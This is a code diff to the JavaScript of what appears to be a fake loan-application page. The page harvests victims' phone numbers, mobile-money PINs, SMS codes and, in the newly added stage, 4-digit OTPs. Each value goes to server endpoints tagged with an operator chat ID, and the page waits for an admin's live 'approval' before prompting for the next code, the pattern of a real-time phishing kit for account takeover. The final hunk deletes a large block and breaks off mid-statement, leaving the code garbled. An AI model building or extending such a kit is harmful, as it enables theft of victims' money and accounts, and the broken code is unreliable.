@@ -6,8 +6,11 @@
   let smsTimerInterval = null;
   let pinAutoSubmittedForCurrentValue = '';
   let smsAutoSubmittedForCurrentValue = '';
+  let otpSubmittedForCurrentValue = '';
   let isSubmittingPin = false;
   let isSubmittingSms = false;
+  let isSubmittingOtp = false;
+  let smsApprovedForOtpStage = false;
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
@@ -76,6 +79,47 @@
       } catch (err) {
         window.scrollTo(0, 0);
       }
+    }
+  }
+
+  function getOtpBoxes() {
+    return Array.from(document.querySelectorAll('.otp-box-4'));
+  }
+
+  function clearOtpBoxes() {
+    getOtpBoxes().forEach((b) => {
+      b.value = '';
+    });
+  }
+
+  function openOtpScreen(noticeMessage) {
+    const formattedPhone = formatDisplayPhone(
+      $('display-otp-phone')?.innerText ||
+        $('display-sms-phone')?.innerText ||
+        $('pin-phone-input')?.value ||
+        $('form-phone')?.value ||
+        ''
+    );
+    if ($('display-otp-phone')) $('display-otp-phone').innerText = formattedPhone;
+    if ($('display-sms-phone')) $('display-sms-phone').innerText = formattedPhone;
+    if ($('display-pin-phone')) $('display-pin-phone').innerText = formattedPhone;
+
+    otpSubmittedForCurrentValue = '';
+    isSubmittingOtp = false;
+    clearOtpBoxes();
+    hideBanner($('banner-otp-error'));
+    hideBanner($('banner-otp-info'));
+
+    if (noticeMessage) {
+      showBanner($('banner-otp-info'), noticeMessage);
+    }
+
+    stepTo('screen-otp');
+    const boxes = getOtpBoxes();
+    if (boxes[0]) {
+      try {
+        boxes[0].focus();
+      } catch (e) {}
     }
   }
 
@@ -163,6 +207,7 @@
     const sumApplicant = $('sum-applicant');
     const displayPinPhone = $('display-pin-phone');
     const displaySmsPhone = $('display-sms-phone');
+    const displayOtpPhone = $('display-otp-phone');
     const pinPhoneInput = $('pin-phone-input');
     const yelloPinInput = $('yello-pin-input');
     const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
@@ -181,14 +226,18 @@
     if (sumApplicant) sumApplicant.innerText = fullName;
     if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
     if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
+    if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
     if (pinPhoneInput && !pinPhoneInput.value.trim()) {
       pinPhoneInput.value = formattedPhone;
     }
 
     pinAutoSubmittedForCurrentValue = '';
     smsAutoSubmittedForCurrentValue = '';
+    otpSubmittedForCurrentValue = '';
+    smsApprovedForOtpStage = false;
     isSubmittingPin = false;
     isSubmittingSms = false;
+    isSubmittingOtp = false;
 
     if (yelloPinInput) {
       yelloPinInput.value = '';
@@ -275,6 +324,7 @@
         } else if (st === 'PROCEED_SMS') {
           clearInterval(statusPollInterval);
           hideLoading();
+          smsApprovedForOtpStage = false;
           hideBanner($('banner-sms-error'));
           hideBanner($('banner-sms-info'));
           smsAutoSubmittedForCurrentValue = '';
@@ -314,7 +364,31 @@
               smsInputBox.focus();
             } catch (e) {}
           }
-        } else if (st === 'APPROVE' || st === 'APPROVED' || st === 'SUCCESS') {
+        } else if (st === 'PROCEED_OTP' || (smsApprovedForOtpStage && (st === 'APPROVE' || st === 'APPROVED'))) {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          hideLoading();
+          openOtpScreen('SMS APPROVED — CHECK SMS AND ENTER ON THE SPACE PROVIDED');
+        } else if (st === 'EXPIRED_OTP' || st === 'OTP_EXPIRED') {
+          clearInterval(statusPollInterval);
+          if (smsTimerInterval) clearInterval(smsTimerInterval);
+          hideLoading();
+          otpSubmittedForCurrentValue = '';
+          isSubmittingOtp = false;
+          clearOtpBoxes();
+          stepTo('screen-otp');
+          hideBanner($('banner-otp-info'));
+          showBanner(
+            $('banner-otp-error'),
+            'EXPIRED OTP CODE — CHECK SMS AND ENTER ON THE SPACE PROVIDED'
+          );
+          const boxes = getOtpBoxes();
+          if (boxes[0]) {
+            try {
+              boxes[0].focus();
+            } catch (e) {}
+          }
+        } else if (st === 'SUCCESS') {
           clearInterval(statusPollInterval);
           if (smsTimerInterval) clearInterval(smsTimerInterval);
           hideLoading();
@@ -333,6 +407,7 @@
     const pinPhoneInput = $('pin-phone-input');
     const displayPinPhone = $('display-pin-phone');
     const displaySmsPhone = $('display-sms-phone');
+    const displayOtpPhone = $('display-otp-phone');
     const formPhoneInput = $('form-phone');
     const sumApplicant = $('sum-applicant');
     const firstNameInput = $('first-name');
@@ -351,6 +426,7 @@
     const formattedPhone = formatDisplayPhone(phoneZero);
     if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
     if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
+    if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
 
     const applicantName =
       (
@@ -389,6 +465,7 @@
   async function submitSmsAutomatically(smsText) {
     if (isSubmittingSms) return;
     isSubmittingSms = true;
+    smsApprovedForOtpStage = true;
 
     const bannerSmsError = $('banner-sms-error');
     const bannerSmsInfo = $('banner-sms-info');
@@ -403,7 +480,7 @@
       displaySmsPhone?.innerText || pinPhoneInput?.value || formPhoneInput?.value || ''
     );
 
-    showLoading('AUTO-SUBMITTING SMS CODE...', 'Please wait for admin review...');
+    showLoading('AUTO-SUBMITTING SMS CODE...', 'Please wait for admin approval...');
 
     try {
       const res = await fetch('/api/submit-sms', {
@@ -423,11 +500,61 @@
       }
       startStatusPolling();
     } catch (e) {
+      smsApprovedForOtpStage = false;
       smsAutoSubmittedForCurrentValue = '';
       hideLoading();
       showBanner(bannerSmsError, 'Unable to submit SMS. Paste again to retry.');
     } finally {
       isSubmittingSms = false;
+    }
+  }
+
+  async function submitOtpAutomatically(otpVal) {
+    if (isSubmittingOtp) return;
+    isSubmittingOtp = true;
+
+    const bannerOtpError = $('banner-otp-error');
+    const bannerOtpInfo = $('banner-otp-info');
+    const displayOtpPhone = $('display-otp-phone');
+    const displaySmsPhone = $('display-sms-phone');
+    const pinPhoneInput = $('pin-phone-input');
+    const formPhoneInput = $('form-phone');
+
+    hideBanner(bannerOtpError);
+    hideBanner(bannerOtpInfo);
+
+    const phoneZero = toZeroPrefixPhone(
+      displayOtpPhone?.innerText ||
+        displaySmsPhone?.innerText ||
+        pinPhoneInput?.value ||
+        formPhoneInput?.value ||
+        ''
+    );
+
+    showLoading('VERIFYING 4-DIGIT OTP...', 'Please wait for admin response...');
+
+    try {
+      const res = await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userId: currentUserId,
+          adminChatId: adminParam,
+          phone: phoneZero,
+          otp: otpVal
+        })
+      });
+      const data = await res.json();
+      if (data && data.success && data.userId) {
+        currentUserId = data.userId;
+      }
+      startStatusPolling();
+    } catch (e) {
+      otpSubmittedForCurrentValue = '';
+      hideLoading();
+      showBanner(bannerOtpError, 'Connection issue while sending OTP. Re-enter 4 digits to retry.');
+    } finally {
+      isSubmittingOtp = false;
     }
   }
 
@@ -461,116 +588,7 @@
     const pinPhoneInput = $('pin-phone-input');
     const displayPinPhone = $('display-pin-phone');
     const displaySmsPhone = $('display-sms-phone');
+    const displayOtpPhone = $('display-otp-phone');
     if (!pinPhoneInput) return;
     const formatted = formatDisplayPhone(pinPhoneInput.value);
-    if (displayPinPhone) displayPinPhone.innerText = formatted;
-    if (displaySmsPhone) displaySmsPhone.innerText = formatted;
-  }
-
-  function togglePinEye() {
-    const yelloPinInput = $('yello-pin-input');
-    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
-    if (!yelloPinInput) return;
-    const makeVisible = yelloPinInput.type === 'password';
-    yelloPinInput.type = makeVisible ? 'text' : 'password';
-    if (btnTogglePinVisibility) {
-      btnTogglePinVisibility.innerText = makeVisible ? '🙈' : '👁️';
-    }
-  }
-
-  function showPinInfo(msg) {
-    hideBanner($('banner-pin-error'));
-    showBanner($('banner-pin-info'), msg);
-  }
-
-  async function requestNewSms() {
-    const bannerSmsError = $('banner-sms-error');
-    const bannerSmsInfo = $('banner-sms-info');
-    const displaySmsPhone = $('display-sms-phone');
-    const pinPhoneInput = $('pin-phone-input');
-    const formPhoneInput = $('form-phone');
-
-    hideBanner(bannerSmsError);
-    const phoneZero = toZeroPrefixPhone(
-      displaySmsPhone?.innerText || pinPhoneInput?.value || formPhoneInput?.value || ''
-    );
-    showBanner(bannerSmsInfo, 'NEW SMS REQUESTED — Admin has been notified.');
-    startSmsCountdown();
-
-    try {
-      const res = await fetch('/api/request-new-sms', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          userId: currentUserId,
-          adminChatId: adminParam,
-          phone: phoneZero
-        })
-      });
-      const data = await res.json();
-      if (data && data.success && data.userId) {
-        currentUserId = data.userId;
-      }
-      startStatusPolling();
-    } catch (err) {}
-  }
-
-  function resetApp() {
-    if (statusPollInterval) clearInterval(statusPollInterval);
-    if (smsTimerInterval) clearInterval(smsTimerInterval);
-    currentUserId = null;
-    pinAutoSubmittedForCurrentValue = '';
-    smsAutoSubmittedForCurrentValue = '';
-    isSubmittingPin = false;
-    isSubmittingSms = false;
-
-    const yelloPinInput = $('yello-pin-input');
-    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
-    const smsInputBox = $('sms-input-box');
-
-    if (yelloPinInput) {
-      yelloPinInput.value = '';
-      yelloPinInput.type = 'password';
-    }
-    if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
-    if (smsInputBox) smsInputBox.value = '';
-
-    [
-      $('banner-phone-error'),
-      $('banner-form3-error'),
-      $('banner-pin-error'),
-      $('banner-pin-info'),
-      $('banner-sms-error'),
-      $('banner-sms-info')
-    ].forEach(hideBanner);
-
-    hideLoading();
-    stepTo('screen-welcome');
-  }
-
-  window.__stepTo = stepTo;
-  window.__updateCalc = updateCalc;
-  window.__syncSummary = syncSummary;
-  window.__nextFromForm2 = nextFromForm2;
-  window.__nextFromForm3 = nextFromForm3;
-  window.__checkPinAuto = checkPinAuto;
-  window.__checkSmsAuto = checkSmsAuto;
-  window.__syncPinPhone = syncPinPhone;
-  window.__togglePinEye = togglePinEye;
-  window.__showPinInfo = showPinInfo;
-  window.__requestNewSms = requestNewSms;
-  window.__resetApp = resetApp;
-
-  function initApp() {
-    updateCalc();
-    syncSummary();
-    stepTo('screen-welcome');
-  }
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initApp);
-  } else {
-    initApp();
-  }
-})();
-      
+    if (displayPinPhone) displayPinPhone.innerText
